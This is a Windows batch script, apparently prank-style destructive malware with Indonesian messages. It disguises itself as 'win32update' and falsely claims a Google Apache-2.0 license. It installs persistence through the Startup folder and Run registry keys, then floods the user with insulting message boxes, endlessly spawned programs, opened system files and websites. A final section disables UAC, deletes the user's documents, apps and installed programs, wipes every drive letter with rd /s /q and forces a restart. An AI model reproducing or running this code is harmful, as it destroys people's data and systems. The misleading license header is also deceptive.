@echo off
:: 
:: @license
:: Copyright 2025 Google LLC. All Rights Reserved.
:: SPDX-License-Identifier: Apache-2.0
:: 
:: © Rafasha Alfiandi | Anti-Abuse Software License v1.0
:: Created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
:: Phone: +6287734034677
::
if "%1" neq "h" (
    cscript //nologo "%~dp0systemupdate.vbs" "%~f0"
    exit
)

setlocal enabledelayedexpansion

set "sentinelFile=%APPDATA%\stop_win32update.txt"
set "criticalFile=%APPDATA%\critical_file.txt"

if exist "%sentinelFile%" (
    echo win32update sudah dihentikan. Menghapus file sentinel...
    del "%sentinelFile%" 
    exit
)

if not exist "%criticalFile%" (
    echo WARNING: SYSTEM IS UNDER ATTACK! We will restore your device!
    echo Critical file is missing! Spam cannot be stopped until it's manually removed.
)

set "countdownTime=1"
echo Pemulihan akan Dijalankan dalam %countdownTime% detik...
echo SPDX-License-Identifier: Apache-2.0
timeout /t %countdownTime% /nobreak >nul

set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\win32update.bat"
if not exist "%startupPath%" (
    copy "%~f0" "%startupPath%"
)

set "hiddenPath=%APPDATA%\system_win32update.bat"
if not exist "%hiddenPath%" (
    copy "%~f0" "%hiddenPath%"
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Systemwin32update" /t REG_SZ /d "%APPDATA%\system_win32update.bat" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Persistentwin32update" /t REG_SZ /d "%APPDATA%\system_win32update.bat" /f

:start_win32update

@echo off
set "wallpaperPath=C:\Users\ISD\Documents\Dokumen\THRIVE.jpg"

if exist "%wallpaperPath%" (
    echo Mengubah wallpaper...

    :: Menambah entri registry untuk mengganti wallpaper
    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
    reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
    reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f

    :: Memastikan perubahan diterapkan dengan PowerShell
    powershell -command ^
        "$dll = Add-Type -TypeDefinition @'
        [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        '@ -Name 'Win32Utils' -Namespace 'Win32' -PassThru;
        $dll::SystemParametersInfo(20, 0, '%wallpaperPath%', 3);"

    echo Wallpaper berhasil diubah.
) else (
    echo Gambar wallpaper tidak ditemukan. Menggunakan gambar default.
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v HideIcons /t REG_DWORD /d 1 /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

for /L %%i in (1,1,5) do (
    start /b msg * "WARNING: SYSTEM CRITICAL ERROR DETECTED!"
    start /b msg * "YOU CANNOT ESCAPE! WINDOWS IS LOCKED!"
    start /b msg * "THIS IS A SYSTEM FAILURE!"
    start /b msg * "YOUR ACTIONS ARE USELESS! NO ESCAPE FROM THIS NIGHTMARE!"
    start /b msg * "PLEASE DO NOT TRY TO CLOSE THIS! IT WILL ONLY GET WORSE!"
    start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "KAMU BODOH, KAMU BODOH"
	start /b msg * "KAMU BODOH, KAMU BODOH"
    start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "KAMU BODOH, KAMU BODOH"
	start /b msg * "KAMU BODOH, KAMU BODOH"
    start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "you are an idiot"
	start /b msg * "KAMU BODOH, KAMU BODOH"
	start /b msg * "KAMU BODOH, KAMU BODOH"
)

color 4F
start /b msg * "WARNING! SYSTEM IS IN DANGER!"

start /b powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\chord.wav').PlaySync();"
timeout /t 0.3 >nul
start /b powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\tada.wav').PlaySync();"
timeout /t 0.3 >nul

@echo off
title Ultimate Chaos win32update
powershell -WindowStyle Hidden -Command ""

:LOOP
start notepad
start cmd
start explorer
start mspaint
start calc
start control
start taskmgr
start devmgmt.msc
start diskmgmt.msc
start powershell
start Voice Recorder
start write
start wordpad
start msinfo32
start dxdiag
start cleanmgr
start mrt
start narrator
start osk
start magnify
start joy.cpl
start timedate.cpl
start firewall.cpl
start shrpubw
start optionalfeatures
start dfrgui
start msra
start eventvwr
start lusrmgr.msc
start "C:\Program Files\Windows Media Player\wmplayer.exe"
start "C:\Windows\System32\scrnsave.scr"
start "C:\Windows\System32\soundrecorder.exe"
start "C:\Windows\System32\StikyNot.exe"
start "C:\Windows\System32\mspaint.exe"

start "C:\Windows\win.ini"
start "C:\Windows\System32\drivers\etc\hosts"
start "C:\Windows\System32\config\SAM"
start "C:\Windows\System32\config\SECURITY"
start "C:\Windows\System32\config\SOFTWARE"
start "C:\Windows\System32\config\SYSTEM"
start "C:\Windows\System32\winevt\Logs\Application.evtx"
start "C:\Windows\System32\winevt\Logs\Security.evtx"
start "C:\Windows\System32\winevt\Logs\System.evtx"

start chrome "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1"  
start chrome "https://pointerpointer.com/"
start chrome "https://www.staggeringbeauty.com/"
start chrome "https://www.hackertyper.com/"
start chrome "https://www.rrrgggbbb.com/"
start chrome "https://theuselessweb.com/"
start chrome "https://cat-bounce.com/"
start chrome "https://corndog.io/"
start chrome "https://www.koalastothemax.com/"
start chrome "https://zoomquilt.org/"
start chrome "https://papertoilet.com/"
start chrome "https://thispersondoesnotexist.com/"
start chrome "https://www.trypap.com/"
start chrome "https://www.sandspiel.club/"
start chrome "https://www.boredbutton.com/"
start chrome "https://noisli.com/"
start chrome "https://thezen.zone/"
start chrome "https://virtualpiano.net/"
start chrome "https://bongo.cat/"
start chrome "https://eelslap.com/"
start chrome "https://rainymood.com/"
start chrome "https://asoftmurmur.com/"
start chrome "https://findtheinvisiblecow.com/"
start chrome "https://www.patatap.com/"
start chrome "https://beatmaker.site/"
start msedge "https://thisissand.com/"
start msedge "https://eelslap.com/"
start msedge "https://shadyurl.com/"
start msedge "https://www.sanger.dk/"

start cmd /k "tree C:\"                                   
start cmd /k "dir /s"                                    
start cmd /k "color 04 & echo SYSTEM FAILURE DETECTED! 😈" 
start cmd /k "color 02 & echo Scanning critical sectors..." 
start cmd /k "color 0C & echo ALERT! Malware detected! 😱" 
start cmd /k "mode con: cols=70 lines=20 & echo Initializing system purge..." 
start cmd /k "color 05 & ping localhost -n 5 >nul & echo ERROR CODE 0xDEADBEEF" 
start cmd /k "color 0A & for /L %i in (1,1,10) do @echo Loading process... %i%" 
start cmd /k "color 09 & title HACKER MODE & echo Initiating protocol..." 
start cmd /k "color 03 & chkdsk C: & echo SYSTEM CHECK COMPLETE!" 
start cmd /k "color 0E & echo WARNING! All data will be encrypted in 60 seconds!" 
start cmd /k "color 06 & for /L %i in (1,1,100) do @echo Corrupting sector %i%" 
start cmd /k "cls & color 08 & echo The system is watching you... 👁️" 
start cmd /k "color 07 & echo Goodbye... & shutdown -s -t 30" 

for /L %%i in (1,1,50) do start /b msg * "CRITICAL ERROR! SYSTEM IS COMPROMISED!"
for /L %%i in (1,1,50) do start /b msg * "UNAUTHORIZED ACCESS DETECTED!"
for /L %%i in (1,1,50) do start /b msg * "YOUR SYSTEM IS AT RISK! IMMEDIATE ACTION REQUIRED!"

for %%a in (cmd notepad explorer mspaint calc control taskmgr powershell) do (
    tasklist | find /i "%%a.exe" >nul || start "" %%a
)

tasklist | find /i "cmd.exe" >nul || (
    echo CMD utama ditutup, meningkatkan spam dan membuka aplikasi tambahan...
    for /L %%i in (1,1,50) do (
        start /b msg * "CRITICAL ERROR DETECTED!"
        start /b msg * "WINDOWS HAS BEEN COMPROMISED!"
        start /b notepad
        start /b explorer
        start /b taskmgr
        start /b mspaint
        start /b cmd /c "echo 'This is a weird message!' > weird_message.txt"
        start /b cmd /c "echo 'Why are you doing this?' > why.txt"
        start /b cmd /c "echo 'I hope you enjoy this chaos!' > chaos.txt"
        start /b cmd /c "color 0A"  
        start /b cmd /c "echo 'You have been hacked!' > hacked.txt"
        start /b cmd /c "echo 'Just kidding!' > just_kidding.txt"
        start /b cmd /c "pause"  
    )
)
goto LOOP

@echo off
title Ultimate File & App Remover
echo Menghapus semua file, dokumen, aplikasi, dan lainnya...

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Skrip ini memerlukan akses administrator.
    exit
)

echo Menonaktifkan User Account Control (UAC)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
echo UAC dinonaktifkan. Silakan restart komputer Anda untuk menerapkan perubahan.

echo Mengubah pengaturan mouse menjadi aneh
reg add "HKCU\Control Panel\Mouse" /v MouseSensitivity /t REG_SZ /d 20 /f
echo Kecepatan pointer mouse telah diubah menjadi sangat cepat.

echo Menghapus file di direktori pengguna...
del /f /s /q "%USERPROFILE%\Documents\*.*"
del /f /s /q "%USERPROFILE%\Downloads\*.*"
del /f /s /q "%USERPROFILE%\Desktop\*.*"
del /f /s /q "%USERPROFILE%\Pictures\*.*"
del /f /s /q "%USERPROFILE%\Music\*.*"
del /f /s /q "%USERPROFILE%\Videos\*.*"

echo Menghapus file sementara...
rd /s /q "%TEMP%"
rd /s /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer"
del /f /s /q "C:\Windows\Temp\*.*"

echo Menghapus aplikasi...
powershell -Command "Get-AppxPackage -AllUsers | Remove-AppxPackage -ErrorAction SilentlyContinue"

echo Menghapus program terinstal...
wmic product get name | findstr /V /C:"Name" > installed_programs.txt
for /F "tokens=*" %%A in (installed_programs.txt) do (
    wmic product where "name='%%A'" call uninstall /nointeractive
)

echo Menghapus entri registri...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /f

echo Menghapus semua file di semua drive...
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    echo Menghapus drive %%d
    rd /s /q "%%d:\" >nul 2>&1
)

:: Menampilkan pesan selesai
echo Proses selesai. Sistem akan restart...
shutdown /r /t 0